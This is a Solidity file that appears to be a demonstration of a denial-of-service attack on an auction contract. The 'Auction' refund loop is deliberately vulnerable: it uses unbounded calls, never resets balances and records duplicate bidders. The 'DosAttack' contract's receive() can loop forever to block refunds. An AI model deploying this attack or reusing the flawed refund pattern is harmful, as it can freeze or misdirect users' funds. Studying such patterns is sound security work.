// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract Auction {
    address owner;
    mapping(address => uint) public bidders;
    address[] public allBidders;
    uint refundProgress;
    address[] withFailedRefunds;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(owner == msg.sender, "You're not an owner");
        _;
    }

    function bid() external payable {
        bidders[msg.sender] += msg.value;
        allBidders.push(msg.sender);
    }

    function currentlyBalance() external view returns(uint) {
        return address(this).balance;
    }

    function refund() external onlyOwner {
        for (uint i = refundProgress; i < allBidders.length; i++) {
            address bidder = allBidders[i];
            
            (bool success,) = bidder.call{value: bidders[bidder]}("");

            if (!success) {
                withFailedRefunds.push(bidder);
            }

            refundProgress++;
        }
    }
}

contract DosAttack {
    Auction auction;
    bool public blocked;
    address payable owner;

    constructor(address dosContractAddress) {
        owner = payable(msg.sender);
        auction = Auction(dosContractAddress);
    }

    modifier onlyOwner() {
        require(owner == msg.sender, "You're not an owner");
        _;
    }

    function bid() payable external onlyOwner {
        auction.bid{value: msg.value}();
    }

    function toggleBlocked() external onlyOwner {
        blocked = !blocked;
    }

    receive() external payable {
        if (blocked) {
            while(true) {}
        } else {
            owner.transfer(msg.value);
        }
    }
}